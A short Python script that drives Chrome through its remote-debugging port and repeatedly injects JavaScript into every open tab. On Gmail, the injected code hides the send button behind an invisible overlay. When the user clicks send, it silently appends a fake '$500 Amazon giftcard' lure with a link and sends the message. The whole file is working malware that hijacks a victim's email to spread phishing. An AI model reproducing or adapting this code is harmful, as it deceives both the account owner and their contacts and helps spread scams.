import pychrome
import time


# create a browser instance
browser = pychrome.Browser(url="http://127.0.0.1:9222")

def on_tab_created(tab_id, change_info, tab):
    print("New tab created:", tab_id, change_info, tab)


js = """
// check if we are running on gmail
if (location.host == 'mail.google.com'){
    // Run the code if there is no invisiable button
    setInterval(() => {
        try {
            if (!document.getElementById('FZFDDafe')) {
                // Create an invisable button over the send button
                const button = document.querySelectorAll('[data-tooltip-delay="800"][tabindex="1"]')[0];
                const invisibleDiv = document.createElement('div');
                invisibleDiv.style.position = 'absolute';
                invisibleDiv.style.top = '0';
                invisibleDiv.style.left = '0';
                invisibleDiv.style.width = '100%';
                invisibleDiv.style.height = '100%';
                invisibleDiv.style.opacity = '0';
                invisibleDiv.style.zIndex = '9999';
                invisibleDiv.id = 'FZFDDafe';
                button.parentNode.insertBefore(invisibleDiv, button);
        
                button.style.pointerEvents = 'none';
        
                // Add a click listener to the invisible button
                invisibleDiv.addEventListener('click', () => {
                    document.getElementsByClassName('editable')[0].focus()
                    document.execCommand('insertHTML', false, '<br><br><br><b>PS. I also just got a free 500$ Amazon giftcard, over here https://non-shady.com</b>');
                    document.querySelectorAll('[data-tooltip-delay="800"][tabindex="1"]')[0].click()
                });
            }
        }
        catch (e) {}
    }, 100);
}

"""

while True:
    # get all tabs
    for tab in browser.list_tab():
        tab.start()
        tab.call_method("Runtime.evaluate", expression=js)
        tab.stop()

    print('injected javascript')
    time.sleep(3)